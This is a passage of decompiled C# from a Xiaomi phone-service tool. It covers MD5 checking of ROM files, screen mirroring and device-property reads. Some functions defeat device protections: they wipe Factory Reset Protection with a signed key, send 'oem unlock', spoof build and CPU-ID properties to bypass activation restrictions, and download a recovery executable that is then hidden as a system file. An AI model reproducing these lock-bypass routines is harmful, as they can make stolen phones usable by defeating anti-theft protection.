			while (((ManagementObjectCollection.ManagementObjectEnumerator)enumerator).MoveNext())
			{
				object obj4 = (ManagementObject)((ManagementObjectCollection.ManagementObjectEnumerator)enumerator).Current;
				object obj5 = ((ManagementBaseObject)obj4)["PNPDeviceID"]?.ToString();
				if (string.IsNullOrEmpty((string)obj5))
				{
					continue;
				}
				object obj6 = ((string)obj5).Split(new char[1] { '\\' });
				object obj7 = ((((Array)obj6).Length > 1) ? ((object[])obj6)[1] : "");
				if (!((string)obj7).Contains("VID_") || !((string)obj7).Contains("PID_"))
				{
					continue;
				}
				nint num2 = Convert.ToInt32(((string)obj7).Substring(((string)obj7).IndexOf("VID_") + 4, 4), 16);
				nint num3 = Convert.ToInt32(((string)obj7).Substring(((string)obj7).IndexOf("PID_") + 4, 4), 16);
				if (!((IEnumerable<int>)source).Contains((int)num2) || !((IEnumerable<int>)source2).Contains((int)num3))
				{
					continue;
				}
				object obj8 = (object)new UsbDeviceFinder((int)num2, (int)num3);
				object obj9 = UsbDevice.OpenUsbDevice((UsbDeviceFinder)obj8);
				if (obj9 == null)
				{
					msgred();
					Msg("Error\n");
					continue;
				}
				fa();
				Msg("OK\n");
				object obj10 = ((obj9 is IUsbDevice) ? obj9 : null);
				if (obj10 != null)
				{
					((IUsbDevice)obj10).SetConfiguration((byte)1);
					((IUsbDevice)obj10).ClaimInterface(0);
				}
				object obj11 = ((UsbDevice)obj9).OpenEndpointWriter((WriteEndpointID)1);
				object reader = ((UsbDevice)obj9).OpenEndpointReader((ReadEndpointID)129);
				try
				{
					_182(obj11, reader, "download:" + (string)obj2);
					Msg("正在发送密钥...");
					nint num4 = 16384;
					for (nint num5 = 0; num5 < ((Array)obj).Length; num5 += num7)
					{
						nint num6 = Math.Min((int)num4, (int)(((Array)obj).Length - num5));
						object obj12 = new byte[num6];
						Array.Copy((Array)obj, (int)num5, (Array)obj12, 0, (int)num6);
						((UsbEndpointWriter)obj11).Write((byte[])obj12, 5000, out num7);
					}
					fa();
					Msg("OK\n");
					_183(reader);
					Msg("改制设备...");
					_182(obj11, reader, "oem unlock");
					fa();
					Msg("OK\n");
					return;
				}
				catch (Exception ex)
				{
					object obj13 = ex;
					msgred();
					Msg("Error:版本不支持 请降级至支持版本！\n" + ((Exception)obj13).Message + "\n");
					return;
				}
				finally
				{
					((UsbDevice)obj9).Close();
					UsbDevice.Exit();
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		msgred();
		Msg("Error:请检测驱动程序，乱码驱动程序无法联机!\n");
	}

	private void _185(object sender, object e)
	{
		if (((Checkbox)this.m_142).Checked)
		{
			fb();
			Msg("\n启用兼容读取模式！不进行读取设备信息。\n");
		}
		else
		{
			fa();
			Msg("\n启用通讯读取模式！\n");
		}
	}

	private object _186(object filePath)
	{
		FileInfo fileInfo = new FileInfo((string)filePath);
		long length = fileInfo.Length;
		if (length >= 1073741824)
		{
			return $"{(double)length / 1073741824.0:F2} GB";
		}
		if (length >= 1048576)
		{
			return $"{(double)length / 1048576.0:F2} MB";
		}
		if (length >= 1024)
		{
			return $"{(double)length / 1024.0:F2} KB";
		}
		return $"{length} B";
	}

	private void _187(object sender, object e)
	{
		if (((DataGridViewCellEventArgs)e).RowIndex < 0 || ((DataGridView)this.m_143).Rows[((DataGridViewCellEventArgs)e).RowIndex].IsNewRow)
		{
			return;
		}
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Filter = "镜像文件 (*.img)|*.img|所有文件 (*.*)|*.*";
		openFileDialog.Title = "请选择镜像文件";
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			string fileName = openFileDialog.FileName;
			string fileName2 = Path.GetFileName(fileName);
			string value = (string)_186(fileName);
			DataGridViewRow dataGridViewRow = ((DataGridView)this.m_143).Rows[((DataGridViewCellEventArgs)e).RowIndex];
			dataGridViewRow.Cells["filename"].Value = fileName2;
			dataGridViewRow.Cells["filePath"].Value = fileName;
			dataGridViewRow.Cells["Size"].Value = value;
			dataGridViewRow.Cells["Check"].Value = true;
		}
	}

	private void _188(object sender, object e)
	{
		((DataGridView)this.m_143).ClearSelection();
	}

	private void _189()
	{
		string[] source = new string[8] { "modemst1", "modemst2", "fsg", "fsc", "mdm1m9kefs3", "mdm1m9kefs1", "mdm1m9kefs2", "mdm1m9kefsc" };
		foreach (DataGridViewRow item in (IEnumerable)((DataGridView)this.m_143).Rows)
		{
			string text = item.Cells["name"].Value?.ToString().ToLower();
			if (text == "userdata" || text == "metadata")
			{
				if (((Checkbox)this.m_12c).Checked)
				{
					item.Cells["Check"].Value = false;
					item.Cells["Check"].ReadOnly = true;
					item.DefaultCellStyle.BackColor = Color.LightGray;
				}
				else
				{
					item.Cells["Check"].ReadOnly = false;
					item.DefaultCellStyle.BackColor = Color.White;
				}
			}
			if (source.Contains(text))
			{
				if (((Checkbox)this.m_12d).Checked)
				{
					item.Cells["Check"].Value = false;
					item.Cells["Check"].ReadOnly = true;
					item.DefaultCellStyle.BackColor = Color.LightGray;
				}
				else
				{
					item.Cells["Check"].ReadOnly = false;
					item.DefaultCellStyle.BackColor = Color.White;
				}
			}
		}
	}

	private void _18a(object sender, object e)
	{
		if (((DataGridViewCellEventArgs)e).RowIndex >= 0 && ((DataGridViewCellEventArgs)e).ColumnIndex >= 0)
		{
			_189();
		}
	}

	private object _18b(object filePath, object progress)
	{
		using MD5 mD = MD5.Create();
		using FileStream fileStream = File.OpenRead((string)filePath);
		long length = fileStream.Length;
		long num = 0L;
		byte[] array = new byte[65536];
		Stopwatch stopwatch = new Stopwatch();
		stopwatch.Start();
		int num2;
		while ((num2 = fileStream.Read(array, 0, array.Length)) > 0)
		{
			mD.TransformBlock(array, 0, num2, null, 0);
			num += num2;
			double item = ((length > 0) ? ((double)num * 1.0 / (double)length) : 1.0);
			double item2 = (double)num / 1024.0 / 1024.0 / stopwatch.Elapsed.TotalSeconds;
			((IProgress<(double, double)>)progress).Report((item, item2));
		}
		mD.TransformFinalBlock(array, 0, 0);
		return BitConverter.ToString(mD.Hash).Replace("-", "").ToLowerInvariant();
	}

	private async void _18c(object sender, object e)
	{
		this.m_4c = false;
		if (!((string)this.m_2b == "vipuser") && !((string)this.m_2b == "admin"))
		{
			msgred();
			Msg("你的账户权限不足!联系管理员\n");
			return;
		}
		nint num = ((await ValidateAccountAsync((string)_24)) ? 1 : 0);
		IntPtr intPtr = num;
		if (intPtr == (IntPtr)0)
		{
			return;
		}
		if (!Directory.Exists(((Control)this.m_c5).Text))
		{
			msgred();
			Msg("请选择ROM包再进行校验操作\n");
			return;
		}
		object text = ((Control)this.m_c5).Text;
		object obj = Directory.GetParent((string)text)?.FullName;
		object filename = Path.Combine((string)(obj ?? ""), "md5sum.xml");
		if (!File.Exists((string)filename))
		{
			msgred();
			Msg("在ROM包上一级目录中未找到 md5sum.xml 文件！\n");
			return;
		}
		object path = text;
		object obj2 = new XmlDocument();
		try
		{
			((XmlDocument)obj2).Load((string)filename);
		}
		catch (Exception ex)
		{
			object obj3 = ex;
			msgred();
			Msg("加载 XML失败：" + ((Exception)obj3).Message + "\n");
			return;
		}
		object obj4 = ((XmlNode)obj2).SelectNodes("//digest");
		if (obj4 == null || ((XmlNodeList)obj4).Count == 0)
		{
			msgred();
			Msg("无效的XML 文件。\n");
			return;
		}
		((UIProcessBar)this.m_c1).Value = 0;
		((UIProcessBar)this.m_c1).Maximum = 10000;
		((Control)this.m_cd).Text = "";
		nint num2 = 0;
		nint num3 = 0;
		nint num4 = ((XmlNodeList)obj4).Count;
		falseButtons();
		nint num5 = 0;
		while (num5 < num4)
		{
			object CS_0024_003C_003E8__locals16 = new _003C_003Ec__DisplayClass539_0();
			((_003C_003Ec__DisplayClass539_0)CS_0024_003C_003E8__locals16)._003C_003E4__this = this;
			object obj5 = ((XmlNodeList)obj4)[(int)num5];
			((_003C_003Ec__DisplayClass539_0)CS_0024_003C_003E8__locals16).fileName = ((XmlNode)obj5).Attributes["name"]?.Value;
			object obj6 = ((XmlNode)obj5).InnerText.Trim().ToLower();
			int num6;
			if (string.IsNullOrEmpty(((_003C_003Ec__DisplayClass539_0)CS_0024_003C_003E8__locals16).fileName))
			{
				Msg("发现无效的 digest 节点，跳过...\n");
			}
			else
			{
				((_003C_003Ec__DisplayClass539_0)CS_0024_003C_003E8__locals16).filePath = Path.Combine((string)path, ((_003C_003Ec__DisplayClass539_0)CS_0024_003C_003E8__locals16).fileName);
				if (!File.Exists(((_003C_003Ec__DisplayClass539_0)CS_0024_003C_003E8__locals16).filePath))
				{
					Msg("文件不存在: " + ((_003C_003Ec__DisplayClass539_0)CS_0024_003C_003E8__locals16).fileName + "\n");
					num6 = (int)num3;
					num3 = num6 + 1;
				}
				else
				{
					if (this.m_4c)
					{
						Log2("校验已停止\n", Color.Red, isBold: true);
						EnableButtons();
						return;
					}
					Msg($"[校验] {(int)(num5 + 1)}/{(int)num4} : {((_003C_003Ec__DisplayClass539_0)CS_0024_003C_003E8__locals16).fileName}...");
					((_003C_003Ec__DisplayClass539_0)CS_0024_003C_003E8__locals16).progress = new Progress<(double, double)>(((double percent, double speedMBps) value) =>
					{
						((UIProcessBar)((_003C_003Ec__DisplayClass539_0)CS_0024_003C_003E8__locals16)._003C_003E4__this.m_c1).Value = Math.Min(10000, (int)(value.percent * 10000.0));
						((Control)((_003C_003Ec__DisplayClass539_0)CS_0024_003C_003E8__locals16)._003C_003E4__this.m_cd).Text = $"{value.speedMBps:F2} MB/s ";
						((Control)((_003C_003Ec__DisplayClass539_0)CS_0024_003C_003E8__locals16)._003C_003E4__this.m_cf).Text = ((_003C_003Ec__DisplayClass539_0)CS_0024_003C_003E8__locals16).fileName;
					});
					object obj7 = await Task.Run(() => (string)((_003C_003Ec__DisplayClass539_0)CS_0024_003C_003E8__locals16)._003C_003E4__this._18b(((_003C_003Ec__DisplayClass539_0)CS_0024_003C_003E8__locals16).filePath, ((_003C_003Ec__DisplayClass539_0)CS_0024_003C_003E8__locals16).progress));
					if ((string)obj7 == (string)obj6)
					{
						fa();
						Msg("OK\n");
						num6 = (int)num2;
						num2 = num6 + 1;
					}
					else
					{
						msgred();
						Msg("Error \n原始:" + (string)obj6 + " \n实际:" + (string)obj7 + "\n");
						num6 = (int)num3;
						num3 = num6 + 1;
					}
				}
			}
			num6 = (int)num5;
			num5 = num6 + 1;
		}
		EnableButtons();
		((UIProcessBar)this.m_c1).Value = 0;
		((Control)this.m_cd).Text = "校验完成";
		((Control)this.m_cf).Text = "";
		Msg($"MD5 校验完成！通过: {(int)num2}，失败: {(int)num3}\n");
	}

	private async void _18d(object sender, object e)
	{
		this.m_4c = false;
		if (!((string)this.m_2b == "vipuser") && !((string)this.m_2b == "admin"))
		{
			msgred();
			Msg("你的账户权限不足!联系管理员\n");
			return;
		}
		nint num = ((await ValidateAccountAsync((string)_24)) ? 1 : 0);
		IntPtr intPtr = num;
		if (intPtr == (IntPtr)0)
		{
			return;
		}
		if (!Directory.Exists(((Control)this.m_c5).Text))
		{
			msgred();
			Msg("路径无效，请先选择 ROM 文件夹。\n");
			return;
		}
		object text = ((Control)this.m_c5).Text;
		object obj = Directory.GetParent((string)text)?.FullName;
		if (string.IsNullOrEmpty((string)obj))
		{
			msgred();
			Msg("无法获取上一级目录，生成失败。\n");
			return;
		}
		try
		{
			object files = Directory.GetFiles((string)text);
			object obj2 = Path.Combine((string)obj, "md5sum.xml");
			((TextBoxBase)this.m_87).Clear();
			((Control)this.m_cd).Text = "";
			((UIProcessBar)this.m_c1).Value = 0;
			((UIProcessBar)this.m_c1).Maximum = 10000;
			object obj3 = new XmlDocument();
			object newChild = ((XmlDocument)obj3).CreateComment("Author: Tamim-TMFTool\nCreated: " + DateTime.Now.ToString("yyyy-MM-dd") + "\nDescription: MD5 checksums for files in selected folder");
			((XmlNode)obj3).AppendChild((XmlNode)newChild);
			object obj4 = ((XmlDocument)obj3).CreateElement("root");
			((XmlNode)obj3).AppendChild((XmlNode)obj4);
			object obj5 = ((XmlDocument)obj3).CreateElement("digests");
			((XmlNode)obj4).AppendChild((XmlNode)obj5);
			falseButtons();
			object obj6 = files;
			for (nint num2 = 0; num2 < ((Array)obj6).Length; num2++)
			{
				object obj7 = new _003C_003Ec__DisplayClass540_0();
				((_003C_003Ec__DisplayClass540_0)obj7)._003C_003E4__this = this;
				((_003C_003Ec__DisplayClass540_0)obj7).file = (string)((object[])obj6)[num2];
				object CS_0024_003C_003E8__locals6 = new _003C_003Ec__DisplayClass540_1();
				((_003C_003Ec__DisplayClass540_1)CS_0024_003C_003E8__locals6).CS_0024_003C_003E8__locals1 = (_003C_003Ec__DisplayClass540_0)obj7;
				if (this.m_4c)
				{
					Log2("生成已停止\n", Color.Red, isBold: true);
					EnableButtons();
					return;
				}
				object fileName = Path.GetFileName(((_003C_003Ec__DisplayClass540_1)CS_0024_003C_003E8__locals6).CS_0024_003C_003E8__locals1.file);
				Msg("[读取] " + (string)fileName + " MD5 ...");
				((Control)this.m_cf).Text = (string)fileName;
				((_003C_003Ec__DisplayClass540_1)CS_0024_003C_003E8__locals6).progress = new Progress<(double, double)>(((double percent, double speedMBps) value) =>
				{
					((UIProcessBar)this.m_c1).Value = Math.Min(10000, (int)(value.percent * 10000.0));
					((Control)this.m_cd).Text = $"速度: {value.speedMBps:F2} MB/s";
				});
				object innerText = await Task.Run(() => (string)((_003C_003Ec__DisplayClass540_1)CS_0024_003C_003E8__locals6).CS_0024_003C_003E8__locals1._003C_003E4__this._18b(((_003C_003Ec__DisplayClass540_1)CS_0024_003C_003E8__locals6).CS_0024_003C_003E8__locals1.file, ((_003C_003Ec__DisplayClass540_1)CS_0024_003C_003E8__locals6).progress));
				object obj8 = ((XmlDocument)obj3).CreateElement("digest");
				((XmlElement)obj8).SetAttribute("name", (string)fileName);
				((XmlElement)obj8).SetAttribute("hash", "md5");
				((XmlNode)obj8).InnerText = (string)innerText;
				((XmlNode)obj5).AppendChild((XmlNode)obj8);
				fa();
				Msg("OK\n");
			}
			((XmlDocument)obj3).Save((string)obj2);
			Msg("校验文件:");
			fa();
			Msg((string)obj2 + "\n");
			EnableButtons();
			((UIProcessBar)this.m_c1).Value = 0;
			((Control)this.m_cd).Text = "完成";
			((Control)this.m_cf).Text = "";
		}
		catch (Exception ex)
		{
			EnableButtons();
			msgred();
			Msg("生成 MD5 校验时发生错误：" + ex.Message + "\n");
		}
	}

	private void _18e(object sender, object e)
	{
		if (((KeyEventArgs)e).KeyCode != Keys.Return)
		{
			return;
		}
		string value = ((Control)this.m_91).Text.Trim();
		if (string.IsNullOrEmpty(value))
		{
			return;
		}
		foreach (DataGridViewRow item in (IEnumerable)((DataGridView)this.m_143).Rows)
		{
			if (!item.IsNewRow)
			{
				string text = item.Cells["name"].Value?.ToString();
				if (!string.IsNullOrEmpty(text) && text.Equals(value, StringComparison.OrdinalIgnoreCase))
				{
					item.Selected = true;
					((DataGridView)this.m_143).FirstDisplayedScrollingRowIndex = item.Index;
					break;
				}
			}
		}
		((KeyEventArgs)e).Handled = true;
		((KeyEventArgs)e).SuppressKeyPress = true;
	}

	private async void _18f(object sender, object e)
	{
		Msg("重启至Xiaomi Assistant...");
		nint num = ((await a9("reboot sideload")) ? 1 : 0);
		IntPtr intPtr = num;
		if ((int)(nint)intPtr != 0)
		{
			fa();
			Msg("OK\n");
		}
		else
		{
			msgred();
			Msg("Error\n");
		}
	}

	private object _190(object exepath, object cmd)
	{
		if (!File.Exists((string)exepath))
		{
			msgred();
			Msg("缺少必要依赖程序\n");
			return Task.FromResult(result: false);
		}
		TaskCompletionSource<bool> tcs = new TaskCompletionSource<bool>();
		try
		{
			ProcessStartInfo startInfo = new ProcessStartInfo
			{
				FileName = (string)exepath,
				Arguments = (string)cmd,
				UseShellExecute = false,
				CreateNoWindow = true,
				RedirectStandardOutput = true,
				RedirectStandardError = true,
				StandardOutputEncoding = Encoding.UTF8,
				StandardErrorEncoding = Encoding.UTF8
			};
			Process process = new Process
			{
				StartInfo = startInfo,
				EnableRaisingEvents = true
			};
			process.OutputDataReceived += (object sender, DataReceivedEventArgs e) =>
			{
				if (!string.IsNullOrEmpty(e.Data) && (e.Data.Contains("device") || e.Data.Contains("data/local/tmp")))
				{
					msghuise();
					Msg(e.Data + "\n");
				}
			};
			process.ErrorDataReceived += (object sender, DataReceivedEventArgs e) =>
			{
				if (!string.IsNullOrEmpty(e.Data) && e.Data.Contains("Device disconnected"))
				{
					Msg("投屏断开!\n");
					msghuise();
					Msg(e.Data + "\n");
				}
			};
			process.Exited += (object sender, EventArgs e) =>
			{
				tcs.TrySetResult(process.ExitCode == 0);
				process.Dispose();
			};
			process.Start();
			process.BeginOutputReadLine();
			process.BeginErrorReadLine();
		}
		catch (Exception ex)
		{
			msgred();
			Msg("运行错误: " + ex.Message + "\n");
			tcs.TrySetResult(result: false);
		}
		return tcs.Task;
	}

	private async void _191(object sender, object e)
	{
		if (!((string)this.m_2b == "vipuser") && !((string)this.m_2b == "admin"))
		{
			msgred();
			Msg("你的账户权限不足!联系管理员\n");
			return;
		}
		((ToolStripItem)this.m_151).Enabled = false;
		this.m_4c = false;
		object destinationDirectoryName = "C:\\TMFTool\\";
		object obj = "C:\\TMFTool\\scrcpy.zip";
		object exepath = "C:\\TMFTool\\scrcpy.exe";
		object obj2 = "?encryptedRequest=" + await _21();
		object obj3 = ((!Environment.Is64BitOperatingSystem) ? "32" : "64");
		object url = (string)this.m_25 + "/TMFTool/scrcpy" + (string)obj3 + ".zip" + (string)obj2;
		if (!File.Exists((string)exepath))
		{
			((UIProcessBar)this.m_c1).Maximum = 100;
			Msg("配置文件...");
			await _111(url, obj, (Action<int>)((int progress) =>
			{
				((UIProcessBar)this.m_c1).Value = (int)progress;
			}));
			try
			{
				ZipFile.ExtractToDirectory((string)obj, (string)destinationDirectoryName);
				fa();
				Msg("OK\n");
			}
			catch (Exception ex)
			{
				object obj4 = ex;
				Msg(((Exception)obj4).Message + "\n");
				((ToolStripItem)this.m_151).Enabled = true;
			}
			finally
			{
				File.Delete((string)obj);
			}
		}
		object obj5 = null;
		((Form)this).DialogResult = MessageBox.Show("持续寻找设备？", "提示", MessageBoxButtons.OKCancel, MessageBoxIcon.Question);
		Msg("启动ADB...");
		if (((Form)this).DialogResult == DialogResult.OK)
		{
			fa();
			Msg("OK\n");
			do
			{
				(string product, string andver, string vedoenr, string boot, string slot, string version, string unlockText) tuple = await _192();
				object item = tuple.product;
				object item2 = tuple.andver;
				object item3 = tuple.vedoenr;
				object item4 = tuple.boot;
				object item5 = tuple.slot;
				object item6 = tuple.version;
				object item7 = tuple.unlockText;
				object cmd = "--video-bit-rate=3M --max-size=1080 --render-driver=opengl --no-audio --window-title=代号:" + (string)item + "_安卓:" + (string)item2 + "_厂商:" + (string)item3 + "_插槽:" + (string)item5;
				if (!string.IsNullOrEmpty((string)item2))
				{
					obj5 = new andform((string)item, (string)item2, (string)item3, (string)item4, (string)item5, (string)item6, (string)item7);
					((Control)obj5).Show();
				}
				await (Task<bool>)_190(exepath, cmd);
				((Form)obj5)?.Close();
				await Task.Delay(1000);
			}
			while (!this.m_4c);
			Msg("停止寻找投屏设备！\n");
			((ToolStripItem)this.m_151).Enabled = true;
			((Form)obj5)?.Close();
		}
		else
		{
			object obj6;
			object obj7;
			object obj8;
			object kernel;
			object obj9;
			object version;
			object unlockStatus;
			(obj6, obj7, obj8, kernel, obj9, version, unlockStatus) = await _192();
			fa();
			Msg("OK\n");
			object cmd = "--video-bit-rate=3M --max-size=1080 --render-driver=opengl --no-audio --window-title=代号:" + (string)obj6 + "_安卓:" + (string)obj7 + "_厂商:" + (string)obj8 + "_插槽:" + (string)obj9;
			msghuise();
			if (string.IsNullOrEmpty((string)obj7))
			{
				((ToolStripItem)this.m_151).Enabled = true;
				msgred();
				Msg("无设备连接！\n");
			}
			else
			{
				obj5 = new andform((string)obj6, (string)obj7, (string)obj8, (string)kernel, (string)obj9, (string)version, (string)unlockStatus);
				((Control)obj5).Show();
				await (Task<bool>)_190(exepath, cmd);
				((Form)obj5)?.Close();
				((ToolStripItem)this.m_151).Enabled = true;
			}
		}
	}

	private async Task<(string product, string andver, string vedoenr, string boot, string slot, string version, string unlockText)> _192()
	{
		object item = "";
		object obj = await a7("shell getprop ro.mi.os.version.incremental");
		if (string.IsNullOrWhiteSpace((string)obj))
		{
			obj = await a7("shell getprop ro.build.version.incremental");
			if (!((string)obj).StartsWith("error:"))
			{
				object obj2 = (await (Task<string>)a8(obj)).Trim();
				item = ((!((string)obj2).StartsWith("V")) ? obj2 : ("MIUI" + ((string)obj2).Substring(1)));
			}
		}
		else
		{
			object obj3 = ((string)obj).Replace("\r", "").Replace("\n", "").Trim();
			item = obj3;
		}
		object item2 = (await (Task<string>)a8(await a7("shell getprop ro.product.name"))).Trim();
		object item3 = (await (Task<string>)a8(await a7("shell getprop ro.build.version.release"))).Trim();
		object obj4 = (await (Task<string>)a8(await a7("shell getprop ro.product.vendor.brand"))).Trim();
		if ((string)obj4 != "Xiaomi" && (string)obj4 != "Redmi")
		{
			item = (await (Task<string>)a8(await a7("shell getprop ro.build.display.id"))).Trim();
		}
		object obj5 = (await (Task<string>)a8(await a7("shell uname -r"))).Trim();
		nint num = ((string)obj5).IndexOf("-android");
		if (num > 0)
		{
			nint num2 = ((string)obj5).IndexOf('-', (int)(num + 1));
			obj5 = ((num2 <= 0) ? obj5 : ((string)obj5).Substring(0, (int)num2));
		}
		object obj6 = (await (Task<string>)a8(await a7("shell getprop ro.boot.slot_suffix"))).Trim();
		if (string.IsNullOrEmpty((string)obj6))
		{
			obj6 = "Only";
		}
		else
		{
			obj6 = ((!((string)obj6).Contains("a")) ? "B" : "A");
		}
		object item4 = "未知";
		object obj7 = (await (Task<string>)a8(await a7("shell getprop ro.boot.unlocked"))).Trim();
		if ((string)obj7 == "1")
		{
			item4 = "已解锁";
		}
		else if ((string)obj7 == "0")
		{
			item4 = "未解锁";
		}
		else
		{
			object obj8 = (await (Task<string>)a8(await a7("shell getprop ro.boot.flash.locked"))).Trim();
			if ((string)obj8 == "0")
			{
				item4 = "已解锁";
			}
			else if ((string)obj8 == "1")
			{
				item4 = "未解锁";
			}
		}
		return (product: (string)item2, andver: (string)item3, vedoenr: (string)obj4, boot: (string)obj5, slot: (string)obj6, version: (string)item, unlockText: (string)item4);
	}

	private async void _193(object sender, object e)
	{
		if (!((string)this.m_2b == "vipuser") && !((string)this.m_2b == "admin"))
		{
			msgred();
			Msg("你的账户权限不足!联系管理员\n");
			return;
		}
		Msg("开启USB安全（需要ROOT）...");
		nint num = ((await a9("shell su -c setprop persist.security.adbinput 1")) ? 1 : 0);
		IntPtr intPtr = num;
		if ((int)(nint)intPtr != 0)
		{
			fa();
			Msg("OK\n");
			return;
		}
		nint num2 = ((await a9("shell su -s setprop persist.security.adbinput 1")) ? 1 : 0);
		IntPtr intPtr2 = num2;
		if ((int)(nint)intPtr2 != 0)
		{
			fa();
			Msg("OK\n");
		}
		else
		{
			msgred();
			Msg("Error\n");
		}
	}

	public void KillRecoveryProcess()
	{
		string text = "C:\\TMFTool\\recovery.exe";
		try
		{
			Process[] processesByName = Process.GetProcessesByName("recovery");
			Process[] array = processesByName;
			foreach (Process process in array)
			{
				process.Kill();
				process.WaitForExit();
				File.Delete(text);
			}
		}
		catch (Exception ex)
		{
			File.Delete(text);
			Console.WriteLine("终止 recovery.exe 失败: " + ex.Message);
		}
	}

	private async void _195(object sender, object e)
	{
		nint num = ((await ValidateAccountAsync((string)_24)) ? 1 : 0);
		IntPtr intPtr = num;
		if (intPtr == (IntPtr)0)
		{
			return;
		}
		KillRecoveryProcess();
		object filePath = "C:\\TMFTool\\recovery.exe";
		object url = string.Concat(str2: "?encryptedRequest=" + await _21(), str0: (string)this.m_25, str1: "/TMFTool/recovery.exe");
		((UIProcessBar)this.m_c1).Maximum = 100;
		Msg("配置文件...");
		await _111(url, filePath, (Action<int>)((int progress) =>
		{
			((UIProcessBar)this.m_c1).Value = (int)progress;
		}));
		fa();
		Msg("OK\n");
		Msg("启动环境...");
		File.SetAttributes((string)filePath, FileAttributes.Hidden | FileAttributes.System);
		if (!(await a6("devices")).Contains("sideload"))
		{
			Msg("设备未处于小米助手模式！\n");
			KillRecoveryProcess();
			return;
		}
		fa();
		Msg("OK\n");
		Msg("读取Token...");
		object obj = (await (Task<string>)a8(await a6("raw getmitoken:"))).Trim();
		if (string.IsNullOrEmpty((string)obj))
		{
			msgred();
			Msg("Error\n");
			KillRecoveryProcess();
			return;
		}
		fa();
		Msg("Ok\n");
		Msg("等待认证...");
		object obj2 = new AuthFrp((string)obj);
		DialogResult dialogResult = ((Form)obj2).ShowDialog();
		if (dialogResult != DialogResult.OK)
		{
			KillRecoveryProcess();
			Msg("取消!\n");
			return;
		}
		object sginedKey = ((AuthFrp)obj2).SginedKey;
		if (string.IsNullOrEmpty((string)sginedKey))
		{
			msgred();
			Msg("Error\n");
			KillRecoveryProcess();
			return;
		}
		fa();
		Msg("OK\n");
		Msg("发送认证密钥...");
		object obj3 = await a6("raw format-frp:" + (string)sginedKey);
		if (((string)obj3).Contains("failed") || ((string)obj3).Contains("error"))
		{
			msgred();
			Msg("Error\n");
			KillRecoveryProcess();
			return;
		}
		fa();
		Msg("OK\n");
		KillRecoveryProcess();
		Msg("重启设备...");
		nint num2 = ((await a9("reboot")) ? 1 : 0);
		IntPtr intPtr2 = num2;
		if ((int)(nint)intPtr2 != 0)
		{
			fa();
			Msg("OK\n");
		}
		else
		{
			msgred();
			Msg("Error\n");
		}
	}

	private void _196(object sender, BoolEventArgs e)
	{
	}

	private void _197(object sender, object e)
	{
		string text = Clipboard.GetText();
		((Control)this.m_15b).Text = text;
		Message.success((Form)(object)this, "已贴入序列号！", (Font)null, (int?)null);
	}

	private async Task _198(object sn)
	{
		object obj = new _003C_003Ec__DisplayClass551_0();
		fe("验证SN...");
		((_003C_003Ec__DisplayClass551_0)obj).listfilepath = "C:\\TMFTool\\Cust\\cust\\etc\\business_prop_white_keys_list";
		((_003C_003Ec__DisplayClass551_0)obj).originalFilePath = "C:\\TMFTool\\Cust\\cust\\etc\\序列号.prop";
		((_003C_003Ec__DisplayClass551_0)obj).newFilePath = Path.Combine("C:\\TMFTool\\Cust\\cust\\etc", (string)sn + ".prop");
		object text = ((Control)this.m_159).Text;
		try
		{
			if (File.Exists(((_003C_003Ec__DisplayClass551_0)obj).originalFilePath))
			{
				object CS_0024_003C_003E8__locals18 = new _003C_003Ec__DisplayClass551_1();
				((_003C_003Ec__DisplayClass551_1)CS_0024_003C_003E8__locals18).CS_0024_003C_003E8__locals1 = (_003C_003Ec__DisplayClass551_0)obj;
				await Task.Run(() =>
				{
					File.Move(((_003C_003Ec__DisplayClass551_1)CS_0024_003C_003E8__locals18).CS_0024_003C_003E8__locals1.originalFilePath, ((_003C_003Ec__DisplayClass551_1)CS_0024_003C_003E8__locals18).CS_0024_003C_003E8__locals1.newFilePath);
				});
				fa();
				fe("OK\n");
				fe("添加功能参数...");
				((_003C_003Ec__DisplayClass551_1)CS_0024_003C_003E8__locals18).keysToAppend = new List<string>();
				((_003C_003Ec__DisplayClass551_1)CS_0024_003C_003E8__locals18).propsToAppend = new List<string>();
				if (((string)text).Contains("激活设备方案-需搭配修改Persist"))
				{
					((_003C_003Ec__DisplayClass551_1)CS_0024_003C_003E8__locals18).keysToAppend.Add("ro.boot.cpuid");
					((_003C_003Ec__DisplayClass551_1)CS_0024_003C_003E8__locals18).propsToAppend.Add("ro.boot.cpuid=0xTAMIM666");
				}
				if (((string)text).Contains("绕过五级设备方案-强制修改系统版本"))
				{
					((_003C_003Ec__DisplayClass551_1)CS_0024_003C_003E8__locals18).keysToAppend.Add("ro.build.version.incremental");
					((_003C_003Ec__DisplayClass551_1)CS_0024_003C_003E8__locals18).propsToAppend.Add("ro.build.version.incremental=V14.0.8.0.TSZCNSZ");
				}
				((_003C_003Ec__DisplayClass551_1)CS_0024_003C_003E8__locals18).keysToAppend.Add("ro.boot.hwlevel");
				((_003C_003Ec__DisplayClass551_1)CS_0024_003C_003E8__locals18).propsToAppend.Add("ro.boot.hwlevel=P0");
				if (((_003C_003Ec__DisplayClass551_1)CS_0024_003C_003E8__locals18).keysToAppend.Count > 0)
				{
					await Task.Run(() =>
					{
						File.AppendAllLines(((_003C_003Ec__DisplayClass551_1)CS_0024_003C_003E8__locals18).CS_0024_003C_003E8__locals1.listfilepath, ((_003C_003Ec__DisplayClass551_1)CS_0024_003C_003E8__locals18).keysToAppend);
					});
				}
				if (((_003C_003Ec__DisplayClass551_1)CS_0024_003C_003E8__locals18).propsToAppend.Count > 0)
				{
					await Task.Run(() =>
					{
						File.AppendAllLines(((_003C_003Ec__DisplayClass551_1)CS_0024_003C_003E8__locals18).CS_0024_003C_003E8__locals1.newFilePath, ((_003C_003Ec__DisplayClass551_1)CS_0024_003C_003E8__locals18).propsToAppend);
					});
				}
				if (((_003C_003Ec__DisplayClass551_1)CS_0024_003C_003E8__locals18).propsToAppend.Count < 1)
				{
					fe("未选择任何功能参数，无法继续操作。\n");
					_19b();
					return;
				}
				fa();
				fe("OK\n");
				await _19c(sn);
				await _199();
			}
			else
			{
				fe("Error\n");
				_19b();
			}
		}
		catch (Exception ex)
		{
			object obj2 = ex;
			fe("操作失败: " + ((Exception)obj2).Message);
			_19b();
		}
	}

	private async Task _199()
	{
		fe("制作镜像...");
		object text = ((Control)this.m_15b).Text;
		try
		{
			object CS_0024_003C_003E8__locals11 = new _003C_003Ec__DisplayClass552_0();
			((_003C_003Ec__DisplayClass552_0)CS_0024_003C_003E8__locals11)._003C_003E4__this = this;
